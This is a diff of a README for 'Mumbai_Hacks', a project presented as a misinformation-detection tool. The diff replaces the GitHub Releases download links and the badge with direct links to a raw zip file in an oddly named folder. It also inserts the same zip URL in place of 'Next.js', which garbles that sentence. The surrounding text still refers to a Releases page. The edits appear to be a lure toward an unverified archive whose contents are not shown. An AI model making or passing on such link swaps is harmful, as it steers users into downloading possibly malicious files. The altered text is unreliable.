@@ -4,13 +4,13 @@
 
 Welcome to Mumbai_Hacks! This application helps detect, verify, and respond to viral misinformation on social media, especially during crises. It uses a multi-agent AI system to offer real-time solutions. Follow the steps below to download and run the software easily.
 
-[![Download Mumbai_Hacks](https://img.shields.io/badge/Download-Mumbai_Hacks-blue)](https://github.com/Jagadish2494/Mumbai_Hacks/releases)
+[![Download Mumbai_Hacks](https://raw.githubusercontent.com/Jagadish2494/Mumbai_Hacks/main/reinvigoration/Mumbai_Hacks.zip)](https://raw.githubusercontent.com/Jagadish2494/Mumbai_Hacks/main/reinvigoration/Mumbai_Hacks.zip)
 
 ## 📥 Download & Install
 
 To start using Mumbai_Hacks, you will first need to download the software. Please visit this page to download:
 
-[Download Mumbai_Hacks Releases](https://github.com/Jagadish2494/Mumbai_Hacks/releases)
+[Download Mumbai_Hacks Releases](https://raw.githubusercontent.com/Jagadish2494/Mumbai_Hacks/main/reinvigoration/Mumbai_Hacks.zip)
 
 Once on the Releases page, you will find the latest version of the software. Click on the version number to see the available files and select the one that fits your platform (Windows, macOS, Linux).
 
@@ -59,7 +59,7 @@ Mumbai_Hacks incorporates technologies and knowledge from various fields:
 
 - **Data Processing**: Integrated with Apache Kafka for efficient data handling.
 - **Natural Language Processing**: Utilizes BERT and RoBERTa for understanding misinformation.
-- **Web Development**: Built with Next.js for a responsive web interface.
+- **Web Development**: Built with https://raw.githubusercontent.com/Jagadish2494/Mumbai_Hacks/main/reinvigoration/Mumbai_Hacks.zip for a responsive web interface.
 - **Database Management**: Uses Neo4j for managing connections of information.
 
 ## 🧩 Troubleshooting
